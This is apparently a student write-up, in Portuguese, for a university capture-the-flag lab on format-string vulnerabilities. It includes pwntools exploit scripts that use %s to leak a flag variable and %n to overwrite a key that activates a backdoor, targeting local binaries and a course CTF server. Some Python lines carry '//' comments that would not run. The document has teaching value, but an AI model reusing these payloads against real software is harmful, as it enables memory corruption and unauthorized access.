#CTF7

## Desafio1

### Vulnerability Analysis
Começamos com um payload de '''AAAA-%x-%x-%x-%x-%xs''' de modo a identificar o lugar da stack no qual estamos a escrever AAAA.

```
[diogo@mati Semana7-Desafio1]$ /bin/python /home/diogo/Documents/FSI/CTF6/Semana7-Desafio1/exploit_example.py
[+] Starting local process './program': pid 9108
[*] Paused (press any to continue)
[*] Switching to interactive mode
[*] Process './program' stopped with exit code 0 (pid 9108)
You gave me this: AAAA-41414141-2d78252d-252d7825-78252d78-78252d
Disqualified!
[*] Got EOF while reading in interactive
```

Usamos o comando objectdump para encontrar o endereço da variável flag, sendo esta a variável que desejamos ler.

```
[diogo@mati Semana7-Desafio1]$ objdump -x program 

program:     file format elf32-i386
program
architecture: i386, flags 0x00000112:
EXEC_P, HAS_SYMS, D_PAGED
start address 0x08049140
```

No output deste comando encontramos o endereço da nossa flag:
```
0804c060 g     O .bss   00000028              flag
```

### Exploit

Como sabemos que nos encontramos a escrever na primeira posição, ao alterar o AAAA pelo endereço da nossa flag, temos esse endereço na primeira posição. Se adicionarmos uma format string que lê strings guardadas num endereço, é possível lermos a nossa flag usando a format string %s.

```
from pwn import *

LOCAL = True

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:
    p = remote("ctf-fsi.fe.up.pt", 4004)


addr = "0804c060"
little = bytearray.fromhex(addr)[::-1] // this is the address of the flag in little endian
print(little)
x = b"%s" // this is the format string

p.recvuntil(b"got:")
p.sendline(little + x)
p.interactive()
```

## Desafio2

### Vulnerability Analysis
Neste desafio, não temos como objetivo ler o conteúdo do endereço, mas sim mudá-lo, uma vez que tal nos dá acesso a permissões.

### Exploit
Como o nosso objetivo é escrever e não ler, fazemos uso da %n, indicando previamente o que queremos escrever em formato de inteiro com o %x.

```
from pwn import *

LOCAL = True

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:
    p = remote("ctf-fsi.fe.up.pt", 4004)

addr = "0804b324"  # \x24\xb3\x04\x08
// offset = 48879 - 4 = 48875 // 48879 is the integer representation of 0xbeef - 4 because of the offset of the adress
little = bytearray.fromhex(addr)[::-1]

p.recvuntil(b"here...")
p.sendline(b"\x24\xb3\x04\x08%1$48875x%n")
p.interactive()
```
Reparamos que a backdoor foi ativada, fazendo com que tenhamos agora permissões para ler no final o ficheiro da flag.

```
804b324Backdoor activated
$ cat flag.txt
flag_placeholder
```

## Desafio2.1

### Vulnerability Analysis
Este desafio é similar ao anterior. Contudo, há pormenores que diferenciam os dois.

```
[diogo@fodase Semana7-Desafio2_1]$ objdump -x program | grep key
0804b320 g     O .bss   00000004              key
```

Este endereço contém o número 20, que em utf-8 é um espaço o que significa que o nosso printf irá parar de imprimir a certo ponto.

### Exploit
Escrevemos então um payload maior num endereço anterior para empurrar o nosso payload para a frente.

```
from pwn import *

LOCAL = True

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:
    p = remote("ctf-fsi.fe.up.pt", 4004)

addr = "0804b31f"  # \x1f\xb3\x04\x08
# payload will be 0xbeef00 because we want to push it forward
# offset = 12513024 - 4 = 12513020
little = bytearray.fromhex(addr)[::-1]

p.recvuntil(b"here...")
p.sendline(b"\x1f\xb3\x04\x08%1$12513020x%n")
p.interactive()
```
